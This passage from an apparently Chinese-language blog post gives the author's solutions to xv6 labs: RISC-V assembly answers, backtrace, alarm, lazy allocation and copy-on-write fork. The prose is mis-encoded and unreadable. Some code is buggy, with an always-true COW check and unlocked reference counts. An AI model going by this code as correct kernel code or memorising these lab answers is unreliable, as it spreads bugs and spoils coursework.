s0,8(sp)</span><br><span class="line">   4:	0800                	addi	s0,sp,16</span><br><span class="line">  return x+3;</span><br><span class="line">&#125;</span><br><span class="line">   6:	250d                	addiw	a0,a0,3</span><br><span class="line">   8:	6422                	ld	s0,8(sp)</span><br><span class="line">   a:	0141                	addi	sp,sp,16</span><br><span class="line">   c:	8082                	ret</span><br><span class="line"></span><br><span class="line">000000000000000e &lt;f&gt;:</span><br><span class="line"></span><br><span class="line">int f(int x) &#123;</span><br><span class="line">   e:	1141                	addi	sp,sp,-16</span><br><span class="line">  10:	e422                	sd	s0,8(sp)</span><br><span class="line">  12:	0800                	addi	s0,sp,16</span><br><span class="line">  return g(x);</span><br><span class="line">&#125;</span><br><span class="line">  14:	250d                	addiw	a0,a0,3</span><br><span class="line">  16:	6422                	ld	s0,8(sp)</span><br><span class="line">  18:	0141                	addi	sp,sp,16</span><br><span class="line">  1a:	8082                	ret</span><br><span class="line"></span><br><span class="line">000000000000001c &lt;main&gt;:</span><br><span class="line"></span><br><span class="line">void main(void) &#123;</span><br><span class="line">  1c:	1141                	addi	sp,sp,-16</span><br><span class="line">  #sp=sp+0x10</span><br><span class="line">  1e:	e406                	sd	ra,8(sp)</span><br><span class="line">  # *(sp+0x8)=ra</span><br><span class="line">  20:	e022                	sd	s0,0(sp)</span><br><span class="line">  #*(sp+0x0)=s0,s0ç›¸å½“äºx86ä¸­çš„rbpæˆ‘æ„Ÿè§‰ï¼Œå°±æ˜¯è®°å½•æ ˆé¡¶çš„å€¼ï¼Œå³å¸§æŒ‡é’ˆ</span><br><span class="line">  22:	0800                	addi	s0,sp,16</span><br><span class="line">  #s0=sp+0x10,å°±æ˜¯è®°å½•è¿™ä¸ªå‡½æ•°çš„å¸§æŒ‡é’ˆ</span><br><span class="line">  printf(&quot;%d %d\n&quot;, f(8)+1, 13);</span><br><span class="line">  24:	4635                	li	a2,13</span><br><span class="line">  #a2=13</span><br><span class="line">  26:	45b1                	li	a1,12</span><br><span class="line">  #a1=12</span><br><span class="line">  28:	00000517          	auipc	a0,0x0</span><br><span class="line">  #a0=(0x0&lt;&lt;12)+pc</span><br><span class="line">  #auipc rd, imm # å°† 20 ä½çš„ç«‹å³æ•°å·¦ç§»12ä½ï¼Œä½ 12 ä½è¡¥é›¶ï¼Œå°†å¾—åˆ°çš„ 32 ä½æ•°ä¸ pc çš„å€¼ç›¸åŠ ï¼Œæœ€åå†™å›å¯„å­˜å™¨ rd ä¸­</span><br><span class="line">  2c:	7a850513          	addi	a0,a0,1960 # 7d0 &lt;malloc+0xea&gt;</span><br><span class="line">  #a0=a0+1960,æ­¤æ—¶a0å°±å­˜å‚¨ç€å­—ç¬¦ä¸²çš„åœ°å€äº†ã€‚ï¼Œæ„Ÿè§‰å°±æ˜¯ç›¸å¯¹äºpcçš„å¯»å€ï¼Œåªä¸è¿‡æ‹†æˆäº†ä¸¤æ­¥</span><br><span class="line">  30:	00000097          	auipc	ra,0x0</span><br><span class="line">  #ra=(0x0&lt;&lt;12)+pc</span><br><span class="line">  34:	5f8080e7          	jalr	1528(ra) # 628 &lt;printf&gt;</span><br><span class="line">  #pc=ra+1528, ra+=8,æ­¤æ—¶å°±è·³è½¬åˆ°äº†printfå‡½æ•°</span><br><span class="line">  exit(0);</span><br><span class="line">  38:	4501                	li	a0,0</span><br><span class="line">  #a0=0</span><br><span class="line">  3a:	00000097          	auipc	ra,0x0</span><br><span class="line">  #ra=pc</span><br><span class="line">  3e:	276080e7          	jalr	630(ra) # 2b0 &lt;exit&gt;</span><br><span class="line">  #pc=ra+630,ra+=8</span><br></pre></td></tr></table></figure>

<p>ä¸€è¡Œä¸€è¡Œåˆ†æä¸‹æ¥å‘ç°å…¶å®å¹¶æ²¡æœ‰è°ƒç”¨få’Œgå‡½æ•°ï¼Œè¢«ç¼–è¯‘å™¨ä¼˜åŒ–æ‰äº†ï¼Œç›´æ¥æŠŠ12èµ‹å€¼ç»™a1,13èµ‹å€¼ç»™a2äº†ã€‚</p>
<p>é—®é¢˜</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">å“ªäº›å¯„å­˜å™¨ä¿å­˜å‡½æ•°çš„å‚æ•°ï¼Ÿä¾‹å¦‚ï¼Œåœ¨mainå¯¹printfçš„è°ƒç”¨ä¸­ï¼Œå“ªä¸ªå¯„å­˜å™¨ä¿å­˜13ï¼Ÿ</span><br><span class="line">a2</span><br><span class="line">mainçš„æ±‡ç¼–ä»£ç ä¸­å¯¹å‡½æ•°fçš„è°ƒç”¨åœ¨å“ªé‡Œï¼Ÿå¯¹gçš„è°ƒç”¨åœ¨å“ªé‡Œ(æç¤ºï¼šç¼–è¯‘å™¨å¯èƒ½ä¼šå°†å‡½æ•°å†…è”ï¼‰</span><br><span class="line">å¹¶æ²¡æœ‰å¯¹få’Œgå‡½æ•°è¿›è¡Œè°ƒç”¨</span><br><span class="line">printfå‡½æ•°ä½äºå“ªä¸ªåœ°å€ï¼Ÿ</span><br><span class="line">0x628</span><br><span class="line">åœ¨mainä¸­printfçš„jalrä¹‹åçš„å¯„å­˜å™¨raä¸­æœ‰ä»€ä¹ˆå€¼ï¼Ÿ</span><br><span class="line">0x38</span><br><span class="line">è¿è¡Œä»¥ä¸‹ä»£ç ã€‚</span><br><span class="line">unsigned int i = 0x00646c72;</span><br><span class="line">printf(&quot;H%x Wo%s&quot;, 57616, &amp;i);</span><br><span class="line">He110 World</span><br><span class="line">åœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼Œâ€œy=â€ä¹‹åå°†æ‰“å°ä»€ä¹ˆ(æ³¨ï¼šç­”æ¡ˆä¸æ˜¯ä¸€ä¸ªç‰¹å®šçš„å€¼ï¼‰ï¼Ÿä¸ºä»€ä¹ˆä¼šå‘ç”Ÿè¿™ç§æƒ…å†µï¼Ÿ</span><br><span class="line">printf(&quot;x=%d y=%d&quot;, 3);</span><br><span class="line">ä¸ç¡®å®šï¼Œå› ä¸ºå‚æ•°ä¸‰å¹¶æ²¡æœ‰è¢«æŒ‡å®šï¼Œæ‰€ä»¥æ­¤æ—¶a2å¯„å­˜å™¨æ˜¯ä»€ä¹ˆå€¼å°±è¾“å‡ºä»€ä¹ˆå€¼</span><br></pre></td></tr></table></figure>

<h3 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h3><p>å°±æ˜¯åˆ©ç”¨s0å’Œraæ¥æ‰“å°å›æº¯å‡½æ•°é“¾</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrace</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  uint64 s0=r_fp();</span><br><span class="line">  uint64 kstack_base=PGROUNDDOWN(s0)+<span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,*(uint64 *)(s0<span class="number">-0x8</span>));</span><br><span class="line">    s0=*(uint64 *)(s0<span class="number">-0x10</span>);</span><br><span class="line">    <span class="keyword">if</span>(s0&gt;=kstack_base)&#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h3><p>è™½ç„¶æ˜¯å›°éš¾çº§åˆ«çš„ï¼Œä½†æ˜¯æ„Ÿè§‰æ¯”é¡µè¡¨é‚£å—çš„å®éªŒè¦å‹å–„å¾ˆå¤šäº†ï¼Œå°±æ˜¯å¯¹alarmç†è§£çš„æœ‰ç‚¹åå·®ï¼Œå¯¼è‡´å¡äº†ä¸€ä¼šä¼šã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64 <span class="title">sys_sigalarm</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  p-&gt;alarm_handler=(<span class="keyword">void</span> *)p-&gt;trapframe-&gt;a1;</span><br><span class="line">  p-&gt;alarm_total_time=p-&gt;trapframe-&gt;a0;</span><br><span class="line">  p-&gt;trapframe-&gt;a0=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">uint64 <span class="title">sys_sigreturn</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  memmove(p-&gt;trapframe,p-&gt;alarm_trapframe,<span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">  p-&gt;is_alarm=<span class="number">0</span>;</span><br><span class="line">  p-&gt;trapframe-&gt;a0=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(p-&gt;alarm_total_time!=<span class="number">0</span>)&#123;</span><br><span class="line">      p-&gt;alarm_time+=<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span>((p-&gt;alarm_time&gt;=p-&gt;alarm_total_time)&amp;&amp;(p-&gt;is_alarm==<span class="number">0</span>))&#123;</span><br><span class="line">        memmove(p-&gt;alarm_trapframe,p-&gt;trapframe,<span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">        p-&gt;trapframe-&gt;epc=(uint64)p-&gt;alarm_handler;</span><br><span class="line">        p-&gt;alarm_handler=<span class="number">0</span>;</span><br><span class="line">        p-&gt;alarm_time=<span class="number">0</span>;</span><br><span class="line">        p-&gt;is_alarm=<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">== Test time == </span><br><span class="line">time: OK </span><br><span class="line">Score: 85/85</span><br></pre></td></tr></table></figure>

<h3 id="ç»“è¯­-2"><a href="#ç»“è¯­-2" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h3><p>é€šè¿‡è¿™ä¸ªå®éªŒæ›´åŠ æ·±åˆ»çš„äº†è§£äº†xv6çš„å†…æ ¸å’Œç”¨æˆ·æ€ä¹‹é—´çš„åˆ‡æ¢ï¼Œä¿®æ”¹èµ·xv6ç›¸å…³ä»£ç ä¹Ÿååˆ†é¡ºæ‰‹äº†ã€‚</p>
<h2 id="LAB5-xv6-lazy-page-allocation"><a href="#LAB5-xv6-lazy-page-allocation" class="headerlink" title="LAB5: xv6 lazy page allocation"></a>LAB5: xv6 lazy page allocation</h2><p>è¿™ä¸ªå®éªŒæ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯å®ç°ç®€å•çš„æƒ°æ€§åˆ†é…</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">argaddr</span><span class="params">(<span class="keyword">int</span> n, uint64 *ip)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *ip = argraw(n);</span><br><span class="line">  <span class="keyword">char</span> *mem;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  uint64 va;</span><br><span class="line">  <span class="keyword">if</span>((walkaddr(p-&gt;pagetable,*ip)==<span class="number">0</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>((PGROUNDUP(p-&gt;trapframe-&gt;sp)<span class="number">-1</span>&lt;(*ip))&amp;&amp;((*ip)&lt;p-&gt;sz))&#123;</span><br><span class="line">      mem=kalloc();</span><br><span class="line">      <span class="keyword">if</span>(!mem)&#123;</span><br><span class="line">        p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memset</span>(mem,<span class="number">0</span>,PGSIZE);</span><br><span class="line">      va=PGROUNDDOWN(*ip);</span><br><span class="line">      <span class="keyword">if</span>(mappages(p-&gt;pagetable, va, PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != <span class="number">0</span>)&#123;</span><br><span class="line">        panic(<span class="string">&quot;mappages fail&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(r_scause() == <span class="number">13</span>||r_scause() == <span class="number">15</span>)&#123;</span><br><span class="line">    uint64 bad_addr=r_stval();</span><br><span class="line">    <span class="keyword">char</span> *mem=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>((bad_addr&lt;p-&gt;sz)&amp;&amp;((mem=kalloc())!=<span class="number">0</span>)&amp;&amp;(PGROUNDUP(p-&gt;trapframe-&gt;sp)<span class="number">-1</span>&lt;bad_addr))&#123;</span><br><span class="line">      uint64 va=PGROUNDDOWN(bad_addr);</span><br><span class="line">      <span class="built_in">memset</span>(mem,<span class="number">0</span>,PGSIZE);</span><br><span class="line">      <span class="keyword">if</span>(mappages(p-&gt;pagetable, va, PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != <span class="number">0</span>)&#123;</span><br><span class="line">        panic(<span class="string">&quot;mappages fail&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h3 id="ç»“æœ-1"><a href="#ç»“æœ-1" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h3><h2 id="Lab6-Copy-on-Write-Fork-for-xv6"><a href="#Lab6-Copy-on-Write-Fork-for-xv6" class="headerlink" title="Lab6: Copy-on-Write Fork for xv6"></a>Lab6: Copy-on-Write Fork for xv6</h2><p>å°±æ˜¯å®ç°forkæ—¶çš„cowæœºåˆ¶ï¼Œæˆ‘çš„æ€è·¯æ˜¯åœ¨forkçš„æ—¶å€™æ²¡æœ‰<code>w</code>æƒé™çš„ç›´æ¥ç›´æ¥å¤åˆ¶æ˜ å°„ï¼Œå¦‚æœæœ‰<code>w</code>æƒé™çš„ç¬¦çŸ¥è¿›ç¨‹çš„flagå…¨éƒ¨<code>&amp;(~PTE_W)|PTE_COW</code>,è¿™æ ·<code>PTE_COW</code>æ ‡å¿—å°±æ—¢å¯ä»¥åˆ¤æ–­æ˜¯å¦æ˜¯cowæ˜ å°„ï¼Œè¿˜å¯ä»¥æ ‡è¯†è¿™ä¸ªæ˜ å°„æ˜¯æœ‰<code>w</code>æƒé™çš„ï¼Œè¿™æ ·å°±é˜²æ­¢äº†å­è¿›ç¨‹çš„æƒé™ç®¡ç†ä¸ä¸¥æ ¼ï¼Œæ¯”å¦‚å­è¿›ç¨‹å†™ä¸å¯å†™é¡µé¢ä¹‹ç±»çš„ã€‚</p>
<p>ç”±äºæˆ‘æ²¡æœ‰ä½¿ç”¨é”ï¼Œå¤šè¿›ç¨‹çš„<code>kfree()</code>å°±ä¼šå‡ºç°é—®é¢˜hhh,ä½†æ˜¯æŠŠcowå®ç°æˆåŠŸæˆ‘å°±å¿ƒæ»¡æ„è¶³äº†ï¼Œä¸‹é¢æ˜¯ä»£ç ï¼Œä¸è¿‡ä»£ç å†™çš„å¾ˆè‡ƒè‚¿ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kfree</span><span class="params">(<span class="keyword">void</span> *pa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  <span class="comment">// printf(&quot;kfree b\n&quot;);</span></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="keyword">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line">  uint64 num=(uint64)pa;</span><br><span class="line">  <span class="keyword">if</span>((--cow_num[num&gt;&gt;<span class="number">12</span>])!=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Fill with junk to catch dangling refs.</span></span><br><span class="line">  <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  r = (struct run*)pa;</span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r-&gt;next = kmem.freelist;</span><br><span class="line">  kmem.freelist = r;</span><br><span class="line">  <span class="comment">// printf(&quot;free e\n&quot;);</span></span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate one 4096-byte page of physical memory.</span></span><br><span class="line"><span class="comment">// Returns a pointer that the kernel can use.</span></span><br><span class="line"><span class="comment">// Returns 0 if the memory cannot be allocated.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">kalloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r = kmem.freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem.freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(r)&#123;</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  &#125;</span><br><span class="line">  uint64 num=(uint64)r;</span><br><span class="line">  cow_num[num&gt;&gt;<span class="number">12</span>]++;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span>*)r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(r_scause()==<span class="number">15</span>)&#123;</span><br><span class="line">    <span class="comment">// printf(&quot;taps b\n&quot;);</span></span><br><span class="line"></span><br><span class="line">    uint64 write_addr=r_stval();</span><br><span class="line">    uint64 va=PGROUNDDOWN(write_addr);</span><br><span class="line">    <span class="keyword">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(write_addr&lt;MAXVA)&#123;</span><br><span class="line">      pte=walk(p-&gt;pagetable,va,<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)&#123;</span><br><span class="line">        panic(<span class="string">&quot;cow usertap pte fail&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      uint flags=PTE_FLAGS(*pte);</span><br><span class="line">      <span class="keyword">char</span> *mem=<span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span>(((flags|PTE_COW)!=<span class="number">0</span>)&amp;&amp;(write_addr&lt;p-&gt;sz)&amp;&amp;((mem=kalloc())!=<span class="number">0</span>))&#123;</span><br><span class="line">        uint64 pa=PTE2PA(*pte);</span><br><span class="line">        memmove(mem,(<span class="keyword">void</span> *)pa,PGSIZE);</span><br><span class="line">        flags=(flags&amp;(~PTE_COW))|PTE_W;</span><br><span class="line">        *pte=PA2PTE(mem)|flags;</span><br><span class="line">        kfree((<span class="keyword">void</span> *)pa);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    copyout(<span class="keyword">pagetable_t</span> pagetable, uint64 dstva, <span class="keyword">char</span> *src, uint64 len)</span><br><span class="line">&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line">  <span class="keyword">pte_t</span> *pte;</span><br><span class="line">  uint flags;</span><br><span class="line">  <span class="keyword">char</span> *mem=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">// printf(&quot;copyout b\n&quot;);</span></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(dstva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(va0&lt;MAXVA)&#123;</span><br><span class="line">      pte=walk(pagetable,va0,<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span>(pte ==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      flags=PTE_FLAGS(*pte);</span><br><span class="line">      <span class="keyword">if</span>((flags&amp;PTE_COW)!=<span class="number">0</span>&amp;&amp;((mem=kalloc())!=<span class="number">0</span>))&#123;</span><br><span class="line">        uint64 pa=PTE2PA(*pte);</span><br><span class="line">        memmove(mem,(<span class="keyword">void</span> *)pa,PGSIZE);</span><br><span class="line">        flags=(flags&amp;(~PTE_COW))|PTE_W;</span><br><span class="line">        *pte=PA2PTE(mem)|flags;</span><br><span class="line">        kfree((<span class="keyword">void</span> *)pa);</span><br><span class="line">        pa0=(uint64)mem;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (dstva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    memmove((<span class="keyword">void</span> *)(pa0 + (dstva - va0)), src, n);</span><br><span class="line"></span><br><span class="line">    len -= n;</span><br><span class="line">    src += n;</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// printf(&quot;copyout e\n&quot;);</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">uvmcopy</span><span class="params">(<span class="keyword">pagetable_t</span> old, <span class="keyword">pagetable_t</span> <span class="keyword">new</span>, uint64 sz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pte_t</span> *pte;</span><br><span class="line">  uint64 pa, i;</span><br><span class="line">  uint flags;</span><br><span class="line">  <span class="comment">// uint64 num;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sz; i += PGSIZE)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: page not present&quot;</span>);</span><br><span class="line">    pa = PTE2PA(*pte);</span><br><span class="line">    cow_num[(pa&gt;&gt;<span 